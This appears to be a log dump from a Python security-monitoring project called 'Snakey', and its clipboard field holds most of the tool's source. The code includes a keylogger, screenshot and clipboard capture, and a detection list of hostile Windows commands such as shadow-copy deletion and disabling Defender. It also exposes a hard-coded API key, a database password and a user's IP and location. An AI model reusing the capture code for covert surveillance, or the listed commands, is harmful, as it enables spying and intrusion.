check_country_change(current_country, alerts_list):\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\") as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\r\n        # Update the file for next session, even if it's the first run or country didn't change\r\n        with open(last_country_path, \"w\") as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\r\n    return alerts_list\r\n\r\n# === New: Check VPN/Proxy IP Function ===\r\ndef check_vpn_proxy_ip(current_ip, alerts_list):\r\n    \"\"\"\r\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\r\n    \"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\r\n    return alerts_list\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],  # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip = None\r\n        current_country = None\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\") # Store for country change check\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n            # NEW: Check for country change\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n\r\n            # NEW: Check for known VPN/proxy IP\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information)  # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path)  # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(\r\n                        f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n                    log_daemon_message(\"ALERT\", f\"VT flagged screenshot as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(\r\n                    f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n                log_daemon_message(\"ALERT\", f\"VT flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n\r\n    def on_press(key):\r\n        nonlocal keys  # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10:  # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5)  # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener:  # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log  # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(),\r\n                                # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()  # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(3)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa7e5b21da57914f38389845b114538f80d2abe45c8e88b17ceb214da1099591", "screenshot_hash": "b4aaf7f8763b93360b8d230b145654fec6b32f5102a74b1efd9dfc83498e0e66", "_raw_log_hash": "579db79f35730bdee7a4320f58958e9e12533666d6c162fec53e06b76f894653"}
{"timestamp": "2025-06-11T16:56:18.557291+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\nimport traceback # Added for detailed error logging\r\n\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\r\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\r\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\r\n\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",  # Formatting drives\r\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\r\n    \"net user\",  # User management (info or creation)\r\n    \"net localgroup administrators\",  # Admin group checks\r\n    \"taskkill /f /im\",  # Force kill process by image name\r\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\r\n    \"reg delete\",  # Delete registry keys\r\n    \"mimikatz\",  # Credential dumping tool\r\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",  # Download files via BITS\r\n    \"wevtutil cl system\",  # Clear event logs\r\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",  # Secure delete tool\r\n]\r\n\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())  # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())  # Still print even if file write fails\r\n\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use verify=False here as well, consistent with Elasticsearch client config\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                            verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a byte to force connection establishment, then close to prevent hanging\r\n    try:\r\n        response.raw.read(1)\r\n    except Exception as read_e:\r\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n    traceback.print_exc() # <-- Added traceback\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # This disables SSL certificate verification\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:  # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, 